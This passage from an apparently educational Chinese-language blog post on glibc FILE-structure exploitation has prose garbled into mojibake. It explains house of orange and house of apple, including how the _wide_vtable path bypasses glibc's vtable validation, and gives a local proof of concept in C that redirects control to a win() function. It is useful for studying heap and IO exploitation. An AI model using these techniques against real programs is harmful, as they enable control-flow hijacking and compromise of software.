class="comment">//æ›¾ç»çš„vtableæŒ‡é’ˆ</span></span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;original vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//ä¿®æ”¹vtableæŒ‡é’ˆæŒ‡å‘å‡è™šè¡¨</span></span><br><span class="line">  *vtable_ptr = fake_vtable;</span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;new vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>ubuntu16.04 &amp; glibc-2.23</code>ä¸Šå®éªŒ,æˆåŠŸåŠ«æŒäº†è™šè¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test<span class="meta"># gcc orange.c -o orange -no-pie -g -no-pie -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x1690010</span></span><br><span class="line">fp @ <span class="number">0x1690530</span></span><br><span class="line">vtable_ptr = <span class="number">0x1690608</span></span><br><span class="line">original vtable_addr = <span class="number">0x7fd1b3f3c6e0</span></span><br><span class="line">new vtable_addr = <span class="number">0x1690010</span></span><br><span class="line">function win called</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>

<p> åŒæ ·çš„ä»£ç å¯¹äºæ›´é«˜ç‰ˆæœ¬çš„<code>glibc</code>æ— æ•ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test]</span><br><span class="line">â””â”€# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x123e2a0</span></span><br><span class="line">fp @ <span class="number">0x123e7c0</span></span><br><span class="line">vtable_ptr = <span class="number">0x123e898</span></span><br><span class="line">original vtable_addr = <span class="number">0x7f4da32ca070</span></span><br><span class="line">new vtable_addr = <span class="number">0x123e2a0</span></span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>



<h3 id="house-of-apple-glibc-2-23"><a href="#house-of-apple-glibc-2-23" class="headerlink" title="[house of apple @ glibc &gt; 2.23]"></a>[house of apple @ glibc &gt; 2.23]</h3><p>é’ˆå¯¹è™šè¡¨çš„æ”»å‡»é€šå¸¸èƒ½å¤Ÿæƒ³åˆ°ä¸¤ç§æ–¹å¼</p>
<p>1.ä¿æŒè™šè¡¨åœ°å€ä¸å˜,ä¿®æ”¹è™šè¡¨ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</p>
<p>2.é€ å‡è™šè¡¨,ç„¶åä¿®æ”¹è™šè¡¨æŒ‡é’ˆ</p>
<p>å¯¹äº1æ¥è¯´,è™šè¡¨ä½äº<code>glibc</code>çš„ä»£ç æ®µ,é€šå¸¸æ˜¯åªè¯»çš„,ä¸å…è®¸éšä¾¿æ”¹å‡½æ•°æŒ‡é’ˆ</p>
<p>å¯¹äº2æ¥è¯´,<code>glibc2.23</code>ä¹‹å‰æ˜¯å¯ä»¥åŠ«æŒè™šè¡¨æŒ‡é’ˆçš„,ç›¸å…³æ”»å‡»æ–¹æ³•å«åš<code>house of orange</code></p>
<p><code>glibc2.24</code>ä¹‹åå°±åŠ å…¥äº†è™šè¡¨çš„åˆæ³•æ€§æ£€æŸ¥</p>
<p>ä½†ä¹Ÿä¸æ˜¯ä¸èƒ½åˆ©ç”¨äº†ï¼Œæ–°æ–¹æ³•å«<code>house of apple</code></p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L398</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/libioP.h#L133</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>

<p><code>IO_validate_vtable</code>ä¼šæ£€æŸ¥è™šè¡¨çš„åˆæ³•æ€§</p>
</blockquote>
<p><strong>è¿™ä¸ªè™šè¡¨åˆæ³•æ€§æ£€æŸ¥ä¼šå‘ç”Ÿåœ¨ä½•æ—¶å‘¢?</strong></p>
<p><code>fwrite</code>å®é™…ä¸Šè°ƒç”¨<code>_IO_fwrite</code>,<code>if</code>åˆ¤æ–­é€šè¿‡,ä¼šæ‰§è¡Œ<code>__IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)	<span class="comment">//</span></span><br><span class="line">  written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);	<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>_IO_sputn</code>æ˜¯ä¸€ä¸ªå®å®šä¹‰,ä¼šåœ¨æ£€æŸ¥<code>vtable</code>åˆæ³•æ€§ä¹‹åè°ƒç”¨<code>vtable.xsputn</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp,__s,__n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line">æ‰©å±•åˆ°:</span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsputn) (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŒç†,ä¸ç®¡<code>fread</code>è¿˜æ˜¯<code>fwrite</code>å®é™…ä¸Šéƒ½ä¼šåœ¨ç»è¿‡<code>vtable</code>åˆæ³•æ€§æ£€æŸ¥å,è°ƒç”¨<code>vtable</code>ä¸­çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>è™šè¡¨åˆæ³•æ€§æ£€æŸ¥äº†ä»€ä¹ˆå‘¢?</strong></p>
<p>è€Œ<code>IO_validate_vtable</code>ä¼šæ£€æŸ¥è™šè¡¨æ˜¯å¦æ˜¯<code>glibc</code>é¢„å®šä¹‰å¥½çš„è™šè¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ptr = vtable</code>æ˜¯<code>FILE</code>ç»“æ„çš„è™šè¡¨æŒ‡é’ˆ</p>
<p><code>const struct _IO_jump_t __io_vtables[]</code>æ˜¯<code>vtables.c</code>ä¸­é¢„å®šä¹‰å¥½çš„è™šè¡¨æ•°ç»„</p>
<p>åœ¨<code>libioP.h</code>ä¸­æš´éœ²äº†è¿™äº›è™šè¡¨çš„å¼•ç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_hidden</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))</span></span><br><span class="line">IO_VTABLES_NUM = <span class="number">14</span></span><br><span class="line"><span class="keyword">sizeof</span> (<span class="keyword">struct</span> _IO_jump_t) = <span class="number">168</span></span><br><span class="line">IO_VTABLES_LEN = <span class="number">14</span>*<span class="number">168</span> = <span class="number">2352</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ä¸€å…±æœ‰14ä¸ªé¢„å®šä¹‰çš„è™šè¡¨</p>
<p>é€šå¸¸æƒ…å†µä¸‹ä½¿ç”¨çš„è™šè¡¨æ˜¯<code>_IO_file_jumps = __io_vtables[IO_FILE_JUMPS]</code></p>
<p><code>IO_validate_vtable</code>æ£€æŸ¥è™šè¡¨<strong>å¿…é¡»æ˜¯è¿™14ä¸ªå…¶ä¸­ä¹‹ä¸€</strong>,é˜²æ­¢è¢«ç”¨æˆ·åŠ«æŒç¯¡æ”¹æŒ‡å‘äº†å †æ ˆæˆ–è€…å †</p>
<p><strong>å¦‚ä½•ç»•è¿‡è™šè¡¨æ£€æŸ¥å‘¢?</strong></p>
<p>å½“freadå‡½æ•°è¢«è°ƒç”¨æ—¶,è°ƒç”¨è¿‡ç¨‹æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread</span><br><span class="line">	_IO_sgetn</span><br><span class="line">		_IO_XSGETN</span><br><span class="line">			JUMP2</span><br><span class="line">				_IO_JUMPS_FUNC</span><br><span class="line">=&gt;					IO_validate_vtable </span><br><span class="line">						_IO_JUMPS_FILE_plus</span><br></pre></td></tr></table></figure>

<p><code>IO_validate_vtable</code>æ˜¯å¿…ç„¶è¢«è°ƒç”¨çš„,æ£€æŸ¥çš„æ˜¯<code>_IO_FILE_plus.vtable</code></p>
<p>ç„¶è€Œåœ¨<code>_IO_XSGETN</code>å®å®šä¹‰è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå…„å¼Ÿå«<code>_IO_WXSGETN</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.38/libio/libioP.h:184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå…„å¼Ÿå®å®šä¹‰å±•å¼€å‘ç°æ˜¯æ²¡æœ‰<code>_IO_validate_vtable</code>è¿™ç§æ£€æŸ¥çš„,ä¼šç›´æ¥è°ƒç”¨åˆ°<code>_IO_FILE._wide_data-&gt;_wide_vtable</code>ä¸­çš„å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_WXSGETN</span><br><span class="line">	WJUMP2</span><br><span class="line">		_IO_WIDE_JUMPS_FUNC</span><br><span class="line">			_IO_WIDE_JUMPS</span><br><span class="line">				_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´åŠ«æŒ<code>_wide_vtable</code>è™šè¡¨æŒ‡é’ˆæ˜¯ä¸ä¼šè¢«æ£€æŸ¥çš„</p>
<p>è€Œ<code>_wide_data</code>ç»“æ„ä½“ä½äº<code>libc</code>çš„åªè¯»å†…å­˜åŒºä¸­,æ— æ³•ä¿®æ”¹å…¶ä¸­çš„<code>_wide_vtable</code>,å› æ­¤è¿˜éœ€è¦ä¼ªé€ ä¸€ä¸ª<code>_wide_data</code></p>
<p>å¹¶ä¸”åªåŠ«æŒ<code>_wide_vtable</code>è¿˜ä¸å¤Ÿ,å› ä¸ºæ­£å¸¸æƒ…å†µä¸‹æ§åˆ¶æµæ˜¯ç»å¯¹ä¸ä¼šè¿›å…¥ä»»ä½•ä¸€ä¸ªå®½å­—èŠ‚ç›¸å…³å‡½æ•°çš„</p>
<p>æ‰€ä»¥è¿˜éœ€è¦æŠŠ<code>_IO_FILE_plus.vtable</code>æ”¹æˆ<code>IO_WFILE_JUMPS</code></p>
<p>æœ€åå†è°ƒç”¨ä¸€ä¸ª<code>fwrite</code></p>
<p>æ¥ä¸‹æ¥æ§åˆ¶æµæ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	=&gt; vtable+0x38</span><br><span class="line">		=&gt; _IO_wfile_xsputn</span><br><span class="line">			=&gt; _IO_wdefault_xsputn @ glibc/libio/wgenops.c</span><br><span class="line">				=&gt; __woverflow</span><br><span class="line">					=&gt; vtable+0x18</span><br><span class="line">						=&gt; _IO_wfile_overflow</span><br><span class="line">							=&gt; _IO_wdoallocbuf</span><br><span class="line">								=&gt; _IO_WDOALLOCATE (wide_data.wide_vtable+0x68 =&gt; win )</span><br></pre></td></tr></table></figure>

<p><strong>æ€»ç»“</strong></p>
<p>æ€»çš„æ¥è¯´,éœ€è¦å¹²è¿™ä¹ˆå‡ æ­¥:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.æ³„éœ²libcåŸºåœ°å€,è®¡ç®—å¾—åˆ°_IO_wfile_jumpsè¡¨çš„åœ°å€</span><br><span class="line">1.æ„é€ fake_wide_vtable,åœ¨å…¶ä¸­å¡«å……ç›®æ ‡å‡½æ•°(å…³é”®æ˜¯+0x68ä½ç½®)</span><br><span class="line">2.æ„é€ fake_wide_data,ä½¿å¾—å…¶åç§»0xe0å¤„çš„_wide_vtableæŒ‡é’ˆå—,æŒ‡å‘1ä¸­æ„é€ çš„fake_wide_vtable</span><br><span class="line">3.ä¿®æ”¹FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) // ~(0x800 | 0x8 | 0x2)</span><br><span class="line">4.ä¿®æ”¹FILE.vtableæŒ‡å‘3ä¸­æ³„éœ²çš„_IO_wfile_jumps</span><br><span class="line">5.ä¿®æ”¹FILE._wide_dataæŒ‡å‘2ä¸­æ„é€ çš„fake_wide_data</span><br><span class="line">6.fwriteè§¦å‘house of apple</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œå¤ä½äº†ä¸‰ä¸ª<code>flag</code>,å„è‡ªçš„ä½œç”¨æ˜¯:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>		<span class="comment">//2.å¿…é¡»æœ‰å†™æƒé™</span></span><br><span class="line"> &#123;</span><br><span class="line">   f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">   __set_errno (EBADF);</span><br><span class="line">   <span class="keyword">return</span> WEOF;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>		<span class="comment">//1.ä¸èƒ½æ˜¯_IO_CURRENTLY_PUTTING,è¿™æ ·å°±ä¼šè¿›å…¥æœ¬ifä»è€Œè°ƒç”¨åˆ°_IO_wdoallocbuf</span></span><br><span class="line">   || f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">   <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))		<span class="comment">//_IO_UNBUFFEREDå¿…é¡»ç­‰äº0æ‰ä¼šè¿›å…¥æœ¬if,è°ƒç”¨åˆ°_IO_WDOALLOCATE</span></span><br><span class="line"> <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>å†™ä¸ªpocæ„æ€æ„æ€</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.æ³„éœ²libcåŸºåœ°å€,è®¡ç®—å¾—åˆ°_IO_wfile_jumpsè¡¨çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.æ„é€ fake_wide_vtable,ä½¿ç”¨winå¡«å……</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.æ„é€ fake_wide_data,ä½¿å¾—å…¶åç§»0xe0å¤„çš„_wide_vtableæŒ‡é’ˆ,æŒ‡å‘1ä¸­æ„é€ çš„fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span 